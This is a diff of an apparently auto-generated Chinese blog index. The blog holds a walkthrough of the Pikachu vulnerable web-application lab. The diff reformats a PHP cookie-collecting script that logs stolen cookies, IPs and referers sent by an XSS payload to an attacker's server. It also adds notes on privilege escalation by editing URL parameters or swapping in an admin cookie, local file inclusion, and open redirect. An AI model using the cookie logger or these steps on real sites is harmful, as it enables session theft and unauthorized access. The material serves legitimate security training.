@@ -175,7 +175,7 @@
 </ul>
 <p>这个js文件可以在页面中追加一个图片资源, 并且指向我们自己的一台服务器的某个文件(即下面的<code>index.php</code>)并向其发送参数. </p>
 <ul>
-<li><code>index.php</code><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">$cookie = $_GET[&apos;cookie&apos;];</span><br><span class="line">$time = time();</span><br><span class="line"></span><br><span class="line">$ip = $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line">$referer = $_SERVER[&apos;HTTP_REFERER&apos;];</span><br><span class="line">$txt = date(&quot;Y/m/d-h:i:s&quot;).&quot; ip=&quot;.$ip.&quot;  cookie=&quot;.$cookie.&quot; referer=&quot;.$referer.&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo $txt;</span><br><span class="line">file_put_contents(&quot;log.txt&quot;,$txt,FILE_APPEND);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<li><code>index.php</code><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">$cookie = $_GET[<span class="string">'cookie'</span>];</span></span><br><span class="line"><span class="php">$time = time();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$ip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span></span><br><span class="line"><span class="php">$referer = $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span></span><br><span class="line"><span class="php">$txt = date(<span class="string">"Y/m/d-h:i:s"</span>).<span class="string">" ip="</span>.$ip.<span class="string">"  cookie="</span>.$cookie.<span class="string">" referer="</span>.$referer.<span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $txt;</span></span><br><span class="line"><span class="php">file_put_contents(<span class="string">"log.txt"</span>,$txt,FILE_APPEND);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
 
 </li>
 </ul>
@@ -370,18 +370,40 @@
 
 `system(&apos;ls&apos;);`
 
+## Over Permission
+### op1 member
+随便登录一个账号后, 点击查看个人信息.
 
+发现被查询的用户是写进URL里的.
 
+修改URL的参数为想要查询的账号即可越权查询.
+### op2 login
+有两个管理员账号. 分别是普通管理(pikachu)和超级管理(admin)
 
+先使用`burp suite`抓取admin的cookie.
 
+在登录pikachu后, 尝试超级操作(如添加账号). 并讲数据包中的cookie换成admin的cookie. 
 
+发现操作成功了.
 
+## File Inclusion
+### File Inclusion(local)
+在URL中filename参数为要包含的文件.
 
+可以实现任意文件读取. 
+
+## URL 重定向
+可以看到URL后面接了一个url参数.
+
+修改这个参数即可跳转到我们指定的页面.例如
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ipadd/pikachu/vul/urlredirect/urlredirect.php?url=https://tjuyjn.top</span><br></pre></td></tr></table></figure>
 </code></pre>
 ]]></content>
       
         
         <tags>
+            
+            <tag> 文件包含漏洞 </tag>
             
             <tag> sql注入 </tag>
             
@@ -392,6 +414,10 @@
             <tag> csrf </tag>
             
             <tag> RCE </tag>
+            
+            <tag> 越权 </tag>
+            
+            <tag> URL重定向 </tag>
             
         </tags>
         
@@ -952,9 +978,9 @@
         
         <tags>
             
-            <tag> web </tag>
-            
             <tag> 主机扫描 </tag>
+            
+            <tag> web </tag>
             
         </tags>
         
